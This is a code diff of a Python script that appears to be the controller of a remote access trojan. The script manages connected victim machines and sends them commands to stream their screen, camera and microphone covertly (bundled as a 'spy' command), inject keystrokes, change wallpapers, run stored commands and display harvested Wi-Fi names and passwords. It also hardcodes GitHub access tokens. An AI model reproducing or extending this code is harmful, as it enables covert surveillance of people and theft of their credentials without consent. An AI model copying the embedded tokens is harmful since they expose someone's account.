@@ -1,4 +1,5 @@
 import socket, os, threading, requests, re
+from os import name
 from vidstream import StreamingServer
 from pyaudio import PyAudio, paInt16
 from time import sleep
@@ -8,6 +9,8 @@ from fct import clear as clearWindow
 from colored import fg, bg, attr
 from iteration_utilities import duplicates
 from github import Github
+from subprocess import call as supCall
+from math import ceil
 def getSelfIp(temp=-1):
     return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][temp]
 def connected():
@@ -20,7 +23,7 @@ def connected():
         return False
 if getSelfIp() not in("192.168.249.97") and connected():
     # First create a Github instance:
-    g = Github("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")
+    g = Github("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")
     # Then play with your Github objects:
     # for repo in g.get_user().get_repos():
     #     print(repo.name)
@@ -91,7 +94,7 @@ class myThread(threading.Thread):
         INIT = {}
         for i in range(0, len(init), 2):
             INIT[init[i]] = init[i+1]
-        print(INIT)
+        # print(INIT)
         self.micIsAlive = False
         self.screen = False
         self.camera = False
@@ -137,6 +140,10 @@ class myThread(threading.Thread):
         except:
             pass
         exit()
+    def writeWifi(self):
+        for line in self.wifi.split('(-)'):
+            for namePass in line.split('-_-'):
+                print(f'{namePass} ')
     def currentThread(self, thread):
         self.currentthread = thread
     def send(self, data):
@@ -203,6 +210,7 @@ class myThread(threading.Thread):
     def micStart(self, port):
         try:
             self.micIsAlive = self.mic.isRunning()
+            print(self.micIsAlive)
         except:
             pass
         if not self.micIsAlive:
@@ -288,7 +296,7 @@ def MainThread():
             # print("Serveur: en attente de connexions des clients TCP ...")
             (con, (ip,port)) = s.accept()
             OK = False
-            init = con.recv(2048).decode()
+            init = con.recv(4096).decode()
             mythread = myThread(ip, port, ID, con, init.split(':'))
             mythread.currentThread(mythread)
             mythreads.append(mythread)
@@ -301,6 +309,41 @@ mainThread = threading.Thread(target=MainThread)
 mainThread.daemon = True
 mainThread.start()
 
+def terminal_size(columns=None, lines=None):
+    if columns or lines:
+        if name == 'posix':
+            if columns:
+                supCall(['stty', 'cols', str(columns)], shell=True)
+            if lines:
+                supCall(['stty', 'rows', str(lines)], shell=True)
+        else:
+            if columns:
+                supCall(['mode', 'con:', 'cols={}'.format(columns)], shell=True)
+            if lines:
+                supCall(['mode', 'con:', 'lines={}'.format(lines)], shell=True)
+    return (((("".join("".join(str(os.get_terminal_size()).split("(")[1]).split(")"))).replace("=", "")).replace("columns", "")).replace("lines", "").split(","))
+def initHelp(file):
+    help = {}
+    with open(file, 'r') as file:
+        for sep in file.read().split('__//__'):
+            first = True
+            stop, sort = True, ''
+            for line in sep.split('\n'):
+                if line and stop:
+                    temp, stop = stopSpaceError(line), False
+                if not stop:
+                    middle = ceil(int(terminal_size()[0])/2)-ceil(len(stopSpaceError(line))/2)
+                    if first:
+                        sort += f"{fg(40)}{attr(1)}{middle*' '+stopSpaceError(line)}{reset}\n"
+                        first = False
+                    else:
+                        sort += middle*' '+stopSpaceError(line)+'\n'
+            help[temp] = sort
+    return help
+def HELP(nameDict=None):
+    if nameDict:
+        return initHelp('help.txt')[nameDict]
+    return initHelp('help.txt')
 def send(data, THREAD=None):
     global addvar, run
     thread = getConnected.getCurrentThreads()
@@ -317,7 +360,9 @@ def send(data, THREAD=None):
                     if thread.cameraIsAlive():
                         thread.send(f"camera {thread.getPortCamera()}")
                 elif data.split()[0] in ("microphone"):
+                    # print(thread.micLives())
                     if not thread.micLives():
+                        # print(f'starting mic on {thread.getPortMic()} {thread.getIp()}')
                         thread.send(f"microphone {thread.getPortMic()} {thread.getIp()}")
                 else:
                     thread.send(data)
@@ -373,9 +418,9 @@ def restart(timeout=2):
     # print(mainThread)
     # print(mythreads)
     mainThread.do_run = False
-    for connexion in getAll.getCon():
+    for thread in getAll.getCurrentThreads():
         try:
-            connexion.send('left'.encode())
+            thread.send('left')
         except:
             pass
     sleep(timeout)
@@ -400,7 +445,7 @@ def supLine(filename, line_to_delete):
     initial_line = 1
     file_lines = {}
     with open(filename) as f:
-        content = f.readlines() 
+        content = f.readlines()
     for line in content:
         file_lines[initial_line] = line.strip()
         initial_line += 1
@@ -408,19 +453,25 @@ def supLine(filename, line_to_delete):
     for line_number, line_content in file_lines.items():
         if line_number != line_to_delete:
             f.write('{}\n'.format(line_content))
+        else:
+            print(f'{line_content} has been successfuly delete')
     f.close()
     
 def printFileCmd():
     filename = "cmd.txt"
     testEmptyLine(filename)
     with open(filename) as fp:
-       line = fp.readline()
-       cnt = 1
-       while line:
-           print("Line {}: {}".format(cnt, line.strip()))
-           line = fp.readline()
-           cnt += 1
-    fp.close()
+        sort = fp.read()
+        if sort:
+            sort = sort.split('\n')
+            loop = 0
+            for line in sort:
+                if line:
+                    loop += 1
+                    print(f'line {loop}: {line}')
+        else:
+            print("no cmd register")
+            print("to register a cmd write register (and enter your cmd here)")
 
 def inputcolor(color=255, attribut=None, content="", preset=None):
     numPreset=preset
@@ -449,8 +500,10 @@ def printSocketCo():
         print()
         print()
         command('list')
-        sleep(5)
+        sleep(2)
 
+
+# ! main
 def command(commandToExecute):
     commandToExecute = stopSpaceError(commandToExecute)
     commandToExecuteList = commandToExecute.split()
@@ -492,23 +545,25 @@ def command(commandToExecute):
         elif commandToExecute in ("stop"):
             global progrun
             progrun = False
-        elif commandToExecute in ("listenIp", "listenip"):
+        elif commandToExecute in ('wifi'):
+            for thread in getAll.getCurrentThreads():
+                print(f'list wifi de {thread.getName()}')
+                print()
+                thread.writeWifi()
+        elif commandToExecute in ("listenIp", "listenip", 'listen'):
             t = threading.Thread(target=printSocketCo)
             t.start()
             input()
             t.do_run = False
             clear()
         elif commandToExecute in ("help", "aide"):
-            help("command")
+            try:
+                print(HELP()['local command'])
+            except:
+                print('aucune aide ici...')
             command(inputcolor(preset=1))
-        elif commandToExecute in ('reloadCo'):
-            for thread in getAll.getCurrentThreads():
-                try:
-                    thread.send('left')
-                    mythreads.pop(mythreads.index(thread))
-                except Exception as e:
-                    print(e)
-                    pass
+        elif commandToExecute in ('reloadCo', 'restart', 'reload'):
+            restart()
         elif commandToExecute in ('stopCo'):
             for thread in getAll.getCurrentThreads():
                 try:
@@ -521,8 +576,7 @@ def command(commandToExecute):
             4
         elif commandToExecute in ("clear", "cleared", "cls", "restart"):
             print('cleared')
-            restart()
-            command(inputcolor(preset=1))
+            clear()
         elif commandToExecute in ("reload", "reloading"):
             os.system(os.path.basename(__file__))
             run, reloading, progrun=False, True, False
@@ -533,20 +587,17 @@ def command(commandToExecute):
                 print(f"{thread.getName()}  --->  {thread.getFullIp()}")
             if not OK:
                 print('aucune connexion active...')
-        # elif commandToExecute in ("command"):
-        #     try:
-        #         temp = run
-        #     except:
-        #         temp = True
-        #     run = True
-        #     clear()
-        #     print(fg(40)+attr(1)+"your in the cmd space"+reset)
-        #     registerCmdAcces("help")
-        #     while run == True:
-        #         registerCmdAcces(inputcolor(preset=1))
-        #     run = temp
-        #     restart()
-        #     command(inputcolor(preset=1))
+        elif commandToExecute in ("command"):
+            try:
+                temp = run
+            except:
+                temp = True
+            run = True
+            registerCmdAcces("help")
+            while run == True:
+                registerCmdAcces(inputcolor(preset=1))
+            run = temp
+            clear()
         else:
             print("Error")
             command(inputcolor(preset=1))
@@ -564,9 +615,15 @@ def registerCmdAcces(data):
             temp = "\n"+" ".join(dataList[1:len(dataList)])
             customcmd.write(temp)
             customcmd.close()
+            print('the command '+temp.replace('\n', '')+' as been create successfuly')
             registerCmdAcces(inputcolor(preset=1))
         elif data in ("help"):
-            help("cmd")
+            clear()
+            print(fg(40)+attr(1)+"your in the cmd space"+reset)
+            try:
+                print(HELP('custom cmd command'))
+            except:
+                print('aucune aide ici...')
             registerCmdAcces(inputcolor(preset=1))
         elif data in ("cmdList", "commandlist", "listcmd", "listcommand", "list"):
             try:
@@ -576,9 +633,7 @@ def registerCmdAcces(data):
                 print("to register a cmd write register (and enter your cmd here)")
             registerCmdAcces(inputcolor(preset=1))
         elif data in ("clear", "cls"):
-            clear()
             registerCmdAcces("help")
-            print("your in the cmd space")
         elif data in ("back"):
             run = False
         elif dataList[0] in ("sup", "del"):
@@ -599,123 +654,126 @@ def registerCmdAcces(data):
 def sendData(data):
     global run, Send, mythreads
     datalist = data.split()
-    numCmd = data.split("µ")
+    numCmd = data.split("µ+µ")
     if len(numCmd) > 1:
         data = "fastcontrol "+data
         datalist = data.split()
-    try:
-        if data in ("die", "kill"):
-            try:
-                send("die")
-            except:
-                pass
-            run = False
-        elif data in ("list"):
-            for thread in getConnected.getCurrentThreads():
-                print(f"{thread.getName()}  --->  {thread.getFullIp()}")
-        elif data in ("help", "aide"):
-            help("sending")
-        elif datalist[0] in ("severalcmd"):
-            send(data)
-        elif datalist[0] in ("wallpaper"):
-            send(data)
-        elif data in ("command"):
-            try:
-                temp = run
-            except:
-                temp = True
-            run = True
-            clear()
-            print(fg(40)+attr(1)+"your in the cmd space"+reset)
-            registerCmdAcces("help")
-            while run == True:
-                registerCmdAcces(inputcolor(preset=1))
-            run = temp
-            restart()
-        elif datalist[0] in ("command") and datalist[1] in ("list") or datalist[0] in ("cmdlist", "listcmd"):
-            try:
-                printFileCmd()
-            except:
-                print("no cmd register")
-                print("to register a cmd write register (and enter your cmd here)")
-        elif datalist[0] in ("command"):
-            if len(datalist) > 2 and datalist[2].isdigit() == True:
-                datalist[2] = int(datalist[2])
-                sendData(retLineCmd("cmd.txt", datalist[2]))
-            elif len(datalist) > 1 and datalist[1].isdigit() == True:
-                datalist[1] = int(datalist[1])
-                sendData(retLineCmd("cmd.txt", datalist[1]))
+    OK = True
+    if not data:
+        OK = False
+    if OK:
+        try:
+            if data in ("die", "kill"):
+                try:
+                    send("die")
+                except:
+                    pass
+                run = False
+            elif data in ('wifi'):
+                for thread in getConnected.getCurrentThreads():
+                    print(f'list wifi de {thread.getName()}')
+                    print()
+                    thread.writeWifi()
+            elif data in ("list"):
+                for thread in getConnected.getCurrentThreads():
+                    print(f"{thread.getName()}  --->  {thread.getFullIp()}")
+            elif data in ("help", "aide"):
+                try:
+                    print(HELP()['sending command'])
+                except:
+                    print('aucune aide ici...')
+            elif datalist[0] in ("severalcmd"):
+                send(data)
+            elif datalist[0] in ("wallpaper"):
+                send(data)
+            elif data in ("command"):
+                try:
+                    temp = run
+                except:
+                    temp = True
+                run = True
+                clear()
+                print(fg(40)+attr(1)+"your in the cmd space"+reset)
+                registerCmdAcces("help")
+                while run == True:
+                    registerCmdAcces(inputcolor(preset=1))
+                run = temp
+                restart()
+            elif datalist[0] in ("command") and datalist[1] in ("list") or datalist[0] in ("cmdlist", "listcmd"):
+                try:
+                    printFileCmd()
+                except:
+                    print("no cmd register")
+                    print("to register a cmd write register (and enter your cmd here)")
+            elif datalist[0] in ("command"):
+                if len(datalist) > 2 and datalist[2].isdigit() == True:
+                    datalist[2] = int(datalist[2])
+                    sendData(retLineCmd("cmd.txt", datalist[2]))
+                elif len(datalist) > 1 and datalist[1].isdigit() == True:
+                    datalist[1] = int(datalist[1])
+                    sendData(retLineCmd("cmd.txt", datalist[1]))
+                else:
+                    print("no int write")
+            elif data in ("left", "quit", "restart", "stop"):
+                try:
+                    send("left")
+                except:
+                    pass
+                run = False
+            elif data in ("screenStart", "screenstart", "screenRun", "screenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
+                send("screen")
+            elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
+                screenStop(reload=True)
+            elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
+                send("camera")
+            elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
+                cameraStop(reload=True)
+            elif data in ("startmic", "micstart"):
+                send("microphone")
+            elif data in ('micStop'):
+                micStop(reload=True)
+            elif data in ("spy"):
+                sendData("startmic")
+                sleep(0.5)
+                sendData("cameraStart")
+                sleep(0.5)
+                sendData("screenStart")
+            elif data in ('spyStop'):
+                sendData("micStop")
+                sleep(0.5)
+                sendData("cameraStop")
+                sleep(0.5)
+                sendData("screenStop")
+            elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
+                datalist.pop(0)
+                print(datalist)
+                data = "fast "+" ".join(datalist)
+                send(data)
+            elif data in ("cls", "clear"):
+                restart()
+            elif datalist[0] in ("time", "sleep"):
+                if not datalist[1]:
+                    datalist.append(1)
+                sleep(int(datalist[1]))
+            elif datalist[0] in ("fastcontrol"):
+                Send = False
+                datalist.pop(0)
+                datalist = " ".join(datalist)
+                datalist = datalist.split("µ")
+                for i in range(len(datalist)):
+                    datalist[i] = stopSpaceError(datalist[i])
+                    sendData(datalist[i])
+                Send = True
+                send("severalcontrol "+addvar)
+                # while data != "ok":
+                #     SocketCo.settimeout(3)
+                #     data = (SocketCo.recv(ceil(32768))).decode()
+                #     print(data)
             else:
-                print("no int write")
-        elif data in ("left", "quit", "restart", "stop"):
-            try:
-                send("left")
-            except:
-                pass
-            run = False
-        elif data in ("screenStart", "screenstart", "screenRun", "screenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
-            send("screen")
-        elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
-            screenStop(reload=True)
-        elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
-            send("camera")
-        elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
-            cameraStop(reload=True)
-        elif data in ("startmic"):
-            send("microphone")
-        elif data in ('micStop'):
-            micStop(reload=True)
-        elif data in ("spy"):
-            sendData("startmic")
-            sleep(0.5)
-            sendData("cameraStart")
-            sleep(0.5)
-            sendData("screenStart")
-        elif data in ('spyStop'):
-            sendData("micStop")
-            sleep(0.5)
-            sendData("cameraStop")
-            sleep(0.5)
-            sendData("screenStop")
-        elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
-            datalist.pop(0)
-            print(datalist)
-            data = "fast "+" ".join(datalist)
-            send(data)
-        elif data in ("update"):
-            run = False
-            send("update")
-        elif datalist[0] in ("update"):
-            run = False
-            if datalist[1] in ("delete", "del", "sup", "clear", "cls", "cleared"):
-                send("updelte")
-            else:
-                send("update")
-        elif data in ("cls", "clear"):
-            restart()
-        elif datalist[0] in ("time", "sleep"):
-            if not datalist[1]:
-                datalist.append(1)
-            sleep(int(datalist[1]))
-        elif datalist[0] in ("fastcontrol"):
-            Send = False
-            datalist.pop(0)
-            datalist = " ".join(datalist)
-            datalist = datalist.split("µ")
-            for i in range(len(datalist)):
-                datalist[i] = stopSpaceError(datalist[i])
-                sendData(datalist[i])
-            Send = True
-            send("severalcontrol "+addvar)
-            # while data != "ok":
-            #     SocketCo.settimeout(3)
-            #     data = (SocketCo.recv(ceil(32768))).decode()
-            #     print(data)
-        else:
-            runThreadingSendAndReceive(data)
-    except Exception as e:
-        print(e)
-        pass
+                runThreadingSendAndReceive(data)
+        except Exception as e:
+            print(e)
+            pass
 
 def screenStop(MYTHREADS=mythreads, reload=False):
     for thread in MYTHREADS:
@@ -739,10 +797,13 @@ def micStop(MYTHREADS=mythreads, reload=False):
     for thread in MYTHREADS:
         try:
             thread.micStop()
+            print('mic stop')
         except:
             pass
+        sleep(0.2)
         if reload:
             thread.micStart(thread.getPortMic())
+            print('mic start')
 
 progrun = True
 while progrun:
